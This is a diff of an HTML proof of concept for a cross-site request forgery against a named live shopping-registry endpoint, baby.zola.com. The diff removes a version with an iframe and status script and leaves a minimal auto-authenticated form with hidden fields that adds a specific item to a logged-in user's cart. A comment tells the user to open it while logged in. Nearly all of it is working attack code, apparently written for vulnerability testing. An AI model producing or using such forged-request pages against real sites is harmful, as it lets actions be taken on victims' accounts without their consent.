@@ -1,55 +1,13 @@
 <!doctype html>
 <html>
-  <head>
-    <meta charset="utf-8">
-    <title>Pure CSRF PoC — Add cart item</title>
-    <style>
-      body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial; padding:18px; }
-      .box { max-width:760px; border:1px solid #eee; padding:12px; border-radius:8px; }
-      iframe { width:100%; height:260px; border:1px solid #ccc; margin-top:8px; }
-      button { padding:8px 12px; margin-top:8px; }
-      .note { color:#555; font-size:13px; margin-top:8px; }
-    </style>
-  </head>
   <body>
-    <div class="box">
-      <h2>Pure HTML CSRF PoC — Add item to cart</h2>
-      <p>Endpoint: <code>https://baby.zola.com/web-registry-api/v1/cart/item</code></p>
-
-      <!-- Classic HTML form: POST (x-www-form-urlencoded). No JavaScript network calls. -->
-      <form id="pocForm" action="https://baby.zola.com/web-registry-api/v1/cart/item" method="POST" target="poc_iframe">
-        <!-- fields matching the JSON keys -->
-        <input type="hidden" name="sku_id" value="65f12ea06b4d027a218b613b">
-        <input type="hidden" name="quantity" value="1">
-        <input type="hidden" name="item_origin" value="BABY_REGISTRY">
-
-        <p>
-          <button type="submit">Submit CSRF (POST)</button>
-          <button type="reset">Reset</button>
-        </p>
-      </form>
-
-      <p class="note">
-        The request POSTS into the iframe below so you can see whether the server redirected to login/account (common on auth/CSRF failure) or returned some HTML. This PoC intentionally uses only HTML form POST (no CORS/fetch).
-      </p>
-
-      <iframe name="poc_iframe" id="poc_iframe"></iframe>
-      <div id="status" class="note">Status: idle</div>
-    </div>
-
-    <script>
-      // purely UI helpers — does not change how the request is sent
-      const form = document.getElementById('pocForm');
-      const status = document.getElementById('status');
-      const iframe = document.getElementById('poc_iframe');
-
-      form.addEventListener('submit', () => {
-        status.textContent = 'Form submitted — waiting for server response in iframe...';
-      });
-
-      iframe.onload = () => {
-        status.textContent = 'Iframe loaded — server responded. If you see account/login UI in the iframe, request was rejected or unauthenticated.';
-      };
-    </script>
+    <!-- Pure HTML CSRF PoC (no JS, no CORS, minimal) -->
+    <!-- Open this while logged in to baby.zola.com and click the button -->
+    <form action="https://baby.zola.com/web-registry-api/v1/cart/item" method="POST">
+      <input type="hidden" name="sku_id" value="65f12ea06b4d027a218b613b">
+      <input type="hidden" name="quantity" value="1">
+      <input type="hidden" name="item_origin" value="BABY_REGISTRY">
+      <input type="submit" value="Submit CSRF">
+    </form>
   </body>
 </html>
